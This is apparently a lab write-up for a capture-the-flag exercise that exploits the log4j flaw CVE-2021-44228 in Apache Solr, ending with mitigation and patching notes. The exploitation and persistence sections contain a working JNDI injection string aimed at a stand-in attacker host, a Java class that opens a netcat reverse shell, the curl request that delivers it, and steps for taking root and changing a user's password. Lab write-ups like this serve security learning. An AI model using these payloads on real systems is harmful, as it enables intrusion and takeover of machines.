# Solar, exploiting log4j
## Exploring CVE-2021-44228

### Task 1 CVE-2021-44228 Introduction
On December 9th, 2021 the world was made aware of a new vulnerability identified as CVE-2021-44228, affecting the Java logging package `log4j` This vulnerability earned a severity score 10.0 (Most critical designation) and offers RCE (Remote Code Execution).

Today `log4j` version `2.15.0rc2` is available and patches this vulnerability. However, millions of things use this logging package as a dependency for their code. This means there is a very big attack surface.

### Task 2 Reconaissance
The target virtual machine contains the software that utilizes the vulnerable version of `log4j` package.

We run a `nmap` scan against the machine to find out what services and ports there are on this machine.

`nmap -sV -p- $IP`

### Task 3 Discovery
The target machine is running Apache Solr 8.11.0, one example of software that is known to include this vulnerable `log4j` package. For the sake of showcasing this vulenrability, the application runs on Java 1.8.0_181

Exploring the web interface at `http://$IP:8983` to get a feel for the application.

### Task 4 Proof of Concept
Note that the URL endpoint needs to be prefaced with the `solr/` prefix when viewing it from the web interface:

`http://$IP:8983/solr/admin/cores`

You also noticed that the `params` seems to be included in the log file. The log4j package works by parsing entires, ultimately to enrich the data -- but may additionally take actions and even evaluate code based off the entry data. This is the gist of the CVE. Other syntax might be in fact *executed* as it is entered into the log files.

Some examples of snytax include:
-   `${sys:os.name}`
-   `${sys:user.name}`
-   `${log4j:configParentLocation}`
-   `${ENV:PATH}`
-   `${ENV:HOSTNAME}`
-   `${java:version}`

The format of the usual syntax that takes advantage of this looks like so:

`${jndi:ldap://ATTACKERCONTROLLEDHOST}`

The syntax includes that the log4j will invoke functionality from "JNDI" (Java Naming and Directory Interface). Ultimately this can be used to access outside resources.

Notice the `ldap://` schema. This indicates that the target will reach out to the attacker endpoint via the LDAP protocol.

This syntax can be entered **ANYWHERE that has data logged by the application**

You can supply `params` to the `/solr/admin/cores` URL, and inject the syntax. You simply supply HTTP GET variables or parameters which will then begin to be parsed by log4j.

Other locations to inject the syntax:
- Input boxes, user and password login forms
- HTTP Headers such as `User-Agent`, `X-Forwarded-For`
- Any place for user-supplied data

![[Pasted image 20211213163136.png]]

![[Pasted image 20211213163105.png]]

### Task 5 Exploitation
The `netcat` listener caught the connection but it may have seen non-printable characters. We build upon this foundation to respond with a real LDAP handler.

We utilize an open-source and public utility to stage an "LDAP Referral Server". This will redirect the initial request of the victim to another location, where you can host a secondary payload that will ultimately run code on the target.
1. `${jndi:ldap://attackerserver:1389/Resource}` -> reaches out to our LDAP Referral Server
2. LDAP Referral Server springboards the request to a secondary `http://attackerserver/resource`
3. The victim retrieves and executes the code present in `http://attackerserver/resource`

This means we need an HTTP server, which we could simply host with any of the following options (serving on port 8000)
- `python3 -m http.server`
- `php -S 0.0.0.0:8000`
- (or any other `busybox httpd` or formal web service you might like)

Run the `marshalsec` LDAP utility that is now listening on port 1389

We make the java code as the payload

```scheme
	public class Exploit{
		static {
			try {
				java.lang.Runtime.getRuntime().exec("nc -e /bin/bash $IP 9999")
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
```

Save this and compile it, we now get `Exploit.class`

We now host a python HTTP server on port 8000 for the redirection to go to and grab this java class file to execute.

`python -m http.server`

We then set up a netcat listener on port 9999 to capture the reverse shell from the victim machine.

The curl request now with the payload is as follows:

```scheme
	curl 'http://VICTIM_IP:8983/solr/admin/cores?foo=$\{jndi:ldap://ATTACKER_IP:1389/Exploit\}'
```

This then makes the request to the victim machine which then goes to our local LDAP redirect server listening which then forwards it to the python HTTP sever that is listening and grabs the java exploit file and executes the netcat command and giving us a reverse shell.

### Task 6 Persistence
Now that we gained access to the machine via a reverse shell, it's now time to make some persistence. Earlier from the `nmap` scan, it showed that port 22 `ssh` was open. The reverse shell says we are user `solr`

To stabalize the shell, we can do the following:

- `python3 -c "import pty; pty.spawn('/bin/bash')"`
- Press `Ctrl+Z` to background the shell
- Press `Enter`
- On local host `stty raw -echo`
- Then `fg`, then press `Enter`
- Press `Enter` two more times
- On the reverse shell `export TERM=xterm`

We run `sudo -l` and see that the user `solr` can run everything without password as *sudo*

We can run `sudo bash` to become root and then `passwd solr` to change their password.

After this we can now ssh into the machine `ssh solr@$IP` with the new password we just changed it to

### Task 7 Detection


### Task 8 Bypasses
The sntax showed was the "typical" one for performing this attack. This syntax might be caught by web application firewalls or easily detected. Because this attack leverages `log4j`, the payload can ultimately access all of the same expansion, substituion, and temlating tricks that the package makes available. This means a threat actor could use any sort of tricks to hide, mask, or obfuscate the payload.

### Task 9 Mitigation
One option for mitigation is to modify the `solr.in.sh` file with a specific syntax.

The file is located at `/etc/default/solr.in.sh`

The Apache Solr website security page explains that you can add specific syntax to the `solr.in.sh` file:

`SOLR_OPTS="$SOLR_OPTS -Dlog4j2.formatMsgNoLookups=true"`

Now no request in made to our LDAP redirect server, so then consequently the Exploit class is not grabbed and executed from the Python HTTP server listening.

### Task 10 Patching
At the time of this exercise, Apache Solr 8.11.1 has not yet been released with a formal patch for CVE-2021-44228. 

Where appropriate, please ensure you patch the `logging-log4j` package to version `2.15.0rc2` or higher.
